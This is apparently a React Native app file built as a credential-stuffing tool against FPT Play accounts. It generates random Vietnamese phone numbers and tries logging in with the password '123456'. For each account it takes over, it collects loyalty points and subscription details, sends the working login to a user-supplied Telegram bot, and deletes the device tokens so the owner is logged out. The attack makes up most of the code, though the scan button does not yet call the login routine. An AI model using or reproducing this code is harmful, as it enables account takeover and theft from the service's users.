/**
 * Sample React Native App
 * https://github.com/facebook/react-native
 *
 * @format
 * @flow strict-local
 */
import React, {useState, useEffect} from 'react';
import {
  StyleSheet,
  Text,
  View,
  Button,
  TextInput,
  FlatList,
  TouchableOpacity,
} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
// import {AsyncStorage} from 'react-native';
export default function FptPlay() {
  var number = [
    '086',
    '096',
    '097',
    '098',
    '032',
    '033',
    '034',
    '035',
    '036',
    '037',
    '038',
    '039',
    '091',
    '094',
    '083',
    '084',
    '085',
    '081',
    '082',
    '089',
    '090',
    '093',
    '070',
    '079',
    '077',
    '076',
    '078',
    '092',
    '056',
    '058',
    '099',
    '059',
  ];
  const [element, setElement] = useState([]);
  const [headNumber, setHeadNumber] = useState('0');
  const [sl, setSL] = useState(1);
  const [botToken, setBotToken] = useState('');
  const [chatId, setChatID] = useState('');
  const [hit, setHit] = useState(0);
  const [fall, setFall] = useState(0);
  const [CusTom, setCusTom] = useState(0);
  const [success, setSuccess] = useState([]);
  const [disabled, setDisabled] = useState(false);
  // const [data, setData] = useState([]);
  const storeData = async value => {
    try {
      const jsonValue = JSON.stringify(value);
      await AsyncStorage.setItem('@hit', jsonValue);
    } catch (e) {
      // saving error
    }
  };

  const getData = async () => {
    try {
      const jsonValue = await AsyncStorage.getItem('@hit');
      // return jsonValue != null ? JSON.parse(jsonValue) : null;
      console.log(JSON.parse(jsonValue));
      if (JSON.parse(jsonValue).length == 0) {
        return;
      }
      const jsonData = JSON.parse(jsonValue);
      var length = JSON.parse(jsonValue).length;
      for (let index = 0; index < length; index++) {
        const newItem = {
          login: jsonData[index].login,
          point: jsonData[index].point,
          rank: jsonData[index].rank,
          tt: jsonData[index].tt,
        };
        console.log(newItem);
        var array = success;
        array.push(newItem);
        setSuccess(Array.from(array));
      }
      var h = hit + jsonData.length - 1;
      setHit((h = h + 1));
      // setDisabled(true);
    } catch (e) {
      // error reading value
    }
  };
  return (
    <View
      style={{
        backgroundColor: '#36454F',
        width: '100%',
        height: '100%',
        justifyContent: 'flex-start',
        alignContent: 'flex-start',
      }}>
      <View style={styles.viewAll}>
        <TextInput
          placeholder="Đầu Số"
          placeholderTextColor={'#D3D3D3'}
          style={styles.textInput}
          onChangeText={title => {
            setHeadNumber(title);
          }}
        />
        {/* <TextInput
          placeholder="Số lượng scan"
          placeholderTextColor={'#D3D3D3'}
          style={styles.textInput}
          onChangeText={title => {
            setSL(title);
          }}
        /> */}
        <TextInput
          placeholder="BotToken"
          placeholderTextColor={'#D3D3D3'}
          style={styles.textInput}
          onChangeText={title => {
            setBotToken(title);
          }}
        />
        <TextInput
          placeholder="ChatID"
          placeholderTextColor={'#D3D3D3'}
          style={styles.textInput}
          onChangeText={title => {
            setChatID(title);
          }}
        />
      </View>
      <View
        style={{
          flexDirection: 'row',
          justifyContent: 'center',
          alignItems: 'center',
          textAlign: 'center',
        }}>
        <TextInput
          style={{width: '30%', height: 100, fontSize: 20, color: 'green'}}
          editable={false}
          selectTextOnFocus={false}
          value={'HIT ' + hit}
          defaultValue={'HIT ' + hit}
        />
        <TextInput
          style={{width: '30%', height: 100, fontSize: 20, color: 'red'}}
          editable={false}
          selectTextOnFocus={false}
          value={'FALL ' + fall}
          defaultValue={'FALL ' + fall}
        />
        <TextInput
          style={{width: '30%', height: 100, fontSize: 20, color: 'yellow'}}
          editable={false}
          selectTextOnFocus={false}
          value={'CUSTOME ' + CusTom}
          defaultValue={'CUSTOME ' + CusTom}
        />
      </View>
      <View style={styles.viewAll}>
        <TouchableOpacity
          style={styles.Button}
          onPress={() => {
            if (
              botToken.length == 0 ||
              chatId.length == 0 ||
              botToken == undefined ||
              chatId == undefined
            ) {
              alert('Bạn chưa nhập bot Token hoặc chat id của telegram');
              return;
            } else {
              for (let index = 0; index < 10; index++) {
                var phoneNumber = '';
                if (headNumber != undefined) {
                  phoneNumber = headNumber;
                } else if (headNumber == undefined) {
                  var i = Math.floor(Math.random() * (number.length - 1));
                  phoneNumber = number[i];
                }
                for (let index = 0; index < 10 - headNumber.length; index++) {
                  phoneNumber = phoneNumber + Math.floor(Math.random() * 10);
                }
                console.log(phoneNumber);
              }
            }
          }}>
          <Text style={{fontSize: 20}}>Bắt đầu Scan</Text>
        </TouchableOpacity>
        <TouchableOpacity
          onPress={() => {
            getData();
            setDisabled(true);
          }}
          style={styles.Button}
          disabled={disabled}>
          <Text style={{fontSize: 20}}>Load data</Text>
        </TouchableOpacity>
      </View>
      <FlatList
        data={success}
        renderItem={({item}) => {
          return (
            <View
              style={{
                margin: 8,
                borderRadius: 10,
                borderWidth: 1,
                padding: 10,
              }}>
              <Text style={styles.listview}>Tài khoản: {item.login}</Text>
              <Text style={styles.listview}>Point: {item.point}</Text>
              <Text style={styles.listview}>Rank: {item.rank}</Text>
              <Text style={styles.listview}>{item.tt}</Text>
            </View>
          );
        }}
      />
    </View>
  );

  function Logic() {
    var token = '';
    var point = 0;
    var rank = '';
    var thongTin = '';
    //bắt đầu

    // element = '0981446695';
    console.log(element);
    //login
    fetch(
      'https://api.fptplay.net/api/v6.2_w/user/otp/login?st=WELbSZIW6U2nYmdb1iwCdQ&e=1616082877731&device=Chrome(version:89)',
      {
        method: 'POST',
        headers: {
          Accept: 'application/json, text/plain, */*',
          'Content-Type': 'application/json',
          'Accept-Encoding': 'gzip, deflate, br',
          'Accept-Language': 'vi',
          Connection: 'keep-alive',
          'Content-Length': '163',
          DNT: '1',
          Host: 'api.fptplay.net',
          Origin: 'https://fptplay.vn',
          Referer: 'https://fptplay.vn/',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'cross-site',
          'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74',
        },
        body: JSON.stringify({
          phone: `${element}`,
          password: '123456',
          client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
          push_reg_id: null,
          st: 'eXXdSwhN3nUcZAQzZjqTpQ',
          e: 1614103746782,
        }),
      },
    )
      .then(response => response.json())
      .then(json => {
        console.log(
          'POST Response',
          'Response Body -> ' + JSON.stringify(json),
        );
        if (json.error_code == 9) {
          console.log('Fall ' + element);
          var f = fall;
          setFall((f = f + 1));
        } else if (json.error_code == 34) {
          console.log('Tiếp Tục ' + element);
          //clear_web_token
          fetch(
            'https://api.fptplay.net/api/v6.2_w/user/otp/clear_web_tokens?st=QH03Q5x_4o88n00pfUYGOw&e=1615002957305&device=Chrome(version:89)',
            {
              method: 'POST',
              headers: {
                Accept: 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'vi',
                Connection: 'keep-alive',
                'Content-Length': '163',
                DNT: '1',
                Host: 'api.fptplay.net',
                Origin: 'https://fptplay.vn',
                Referer: 'https://fptplay.vn/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent':
                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74',
              },
              body: JSON.stringify({
                phone: `${element}`,
                password: '123456',
                client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
                push_reg_id: null,
                st: 'DzjlqIQLG_ZYcZcx_dJZoA',
                e: 1614187162614,
              }),
            },
          )
            .then(response => response.json())
            .then(json => {
              console.log(
                'POST Response',
                'Response Body -> ' + JSON.stringify(json),
              );
              token = json.data.access_token;
              //get Point
              getInfo(thongTin);
            })
            .catch(error => {
              console.error(error);
            })
            .done();
        } else if (json.error_code == 0) {
          console.log('Login thành công ' + element);
          token = json.data.access_token;
          getInfo(thongTin);
        } else if (json.error_code == 33) {
          console.log('2FA ' + element);
          var c = CusTom;
          setCusTom((c = c + 1));
        }
      })
      .catch(error => {
        console.error(error);
      })
      .done();
    function getInfo(thongTin) {
      fetch(
        'https://api.fptplay.net/apiloy/v1_w/user/point?token=undefined&st=r6JBUel-WJyemw_Kp3fwWg&e=1616082981592&device=Chrome(version:89)',
        {
          method: 'GET',
          headers: {
            Accept: 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
            Authorization: `Bearer ${token}`,
            Connection: 'keep-alive',
            DNT: '1',
            Host: 'api.fptplay.net',
            Origin: 'https://fptplay.vn',
            Referer: 'https://fptplay.vn/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74',
          },
        },
      )
        .then(response => response.json())
        .then(json => {
          console.log(
            'POST Response',
            'Response Body -> ' + JSON.stringify(json),
          );
          point = json.data.available_point;
          rank = json.data.rank.rank_name;
          console.log(point + ' - ' + rank);
        })
        .catch(error => {
          console.error(error);
        })
        .done();

      //get Vip
      fetch(
        'https://api.fptplay.net/api/v6.2_w/payment/get_user_vips?st=nKxyJrcRX3Rd41aawV147g&e=1616083050537&device=Chrome(version:89)',
        {
          method: 'GET',
          headers: {
            Accept: 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
            Authorization: `Bearer ${token}`,
            Connection: 'keep-alive',
            DNT: '1',
            Host: 'api.fptplay.net',
            Origin: 'https://fptplay.vn',
            Referer: 'https://fptplay.vn/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74',
          },
        },
      )
        .then(response => response.json())
        .then(json => {
          console.log(JSON.stringify(json));
          if (json.packages.length == 0) {
            console.log('Free ' + element);
            var c = CusTom;
            setCusTom((c = c + 1));
          } else {
            for (let index = 0; index < json.packages.length; index++) {
              if (json.packages[index].msg != 'Hết hạn') {
                thongTin =
                  thongTin +
                  json.packages[index].name +
                  ' ' +
                  json.packages[index].msg +
                  ' ';
              }
              if (json.packages[index].msg == 'Hết hạn') {
                thongTin = thongTin + '';
              }
            }
            console.log(thongTin);
            if (thongTin == '') {
              console.log('Hết Hạn ' + element);
              var c = CusTom;
              setCusTom((c = c + 1));
            } else {
              const newItem = {
                login: `${element}:123456`,
                point: point,
                rank: rank,
                tt: thongTin,
              };
              var array = success;
              array.push(newItem);
              setSuccess(Array.from(array));
              var h = hit;
              setHit((h = h + 1));
              storeData(success);
              fetch(
                `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=FPT Play | ${element}:123456 | Point: ${point} | Rank: ${rank}| INFO: ${thongTin}`,
              )
                .catch(error => {
                  console.error(error);
                })
                .done();
              console.log(thongTin);
            }
          }
        })
        .catch(error => {
          console.error(error);
        })
        .done();
      thongTin = '';
      //get_device_list
      fetch(
        'https://api.fptplay.net/api/v6.2_w/user/otp/device_list?st=hVlGVCD_UMICyJgGvB8NNg&e=1612895053925&device=Chrome(version:88)',
        {
          method: 'GET',
          headers: {
            Accept: 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
            Authorization: `Bearer ${token}`,
            Connection: 'keep-alive',
            DNT: '1',
            Host: 'api.fptplay.net',
            Origin: 'https://fptplay.vn',
            Referer: 'https://fptplay.vn/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74',
          },
        },
      )
        .then(response => response.json())
        .then(json => {
          console.log(JSON.stringify(json));
          for (let index = 0; index < json.data.device_list.length; index++) {
            const newItem = json.data.device_list[index].id;
            //deactive_device
            fetch(
              'https://api.fptplay.net/api/v6.2_w/user/otp/delete_tokens?st=saAMGSqz_6hohTexEPpRPA&e=1612895287974&device=Chrome(version:88)',
              {
                method: 'POST',
                headers: {
                  Accept: 'application/json, text/plain, */*',
                  'Content-Type': 'application/json',
                  'Accept-Encoding': 'gzip, deflate, br',
                  'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                  Authorization: `Bearer ${token}`,
                  Connection: 'keep-alive',
                  DNT: '1',
                  Host: 'api.fptplay.net',
                  Origin: 'https://fptplay.vn',
                  Referer: 'https://fptplay.vn/',
                  'Sec-Fetch-Dest': 'empty',
                  'Sec-Fetch-Mode': 'cors',
                  'Sec-Fetch-Site': 'cross-site',
                  'User-Agent':
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74',
                },
                body: JSON.stringify({
                  token_ids: [newItem],
                  st: 'PjzFNO3rttxAQj53YUHLcA',
                  e: 1642865059229,
                }),
              },
            )
              .then(response => response.json())
              .then(json => {
                console.log(JSON.stringify(json));
              })
              .catch(error => {
                console.error(error);
              })
              .done();
          }
        })
        .catch(error => {
          console.error(error);
        })
        .done();
    }
  }
}

const styles = StyleSheet.create({
  viewAll: {
    backgroundColor: '#36454F',
    width: '100%',
    color: '#FFF',
    justifyContent: 'flex-start',
    alignItems: 'center',
  },
  textInput: {
    width: '90%',
    height: 40,
    borderWidth: 1,
    margin: 10,
    color: '#D3D3D3',
  },
  Button: {
    width: '90%',
    height: 50,
    borderRadius: 10,
    borderWidth: 1,
    fontSize: 20,
    margin: 10,
    padding: 10,
    backgroundColor: 'gray',
    alignItems: 'center',
  },
  listview: {
    width: '90%',
    color: '#D3D3D3',
    fontSize: 20,
  },
});
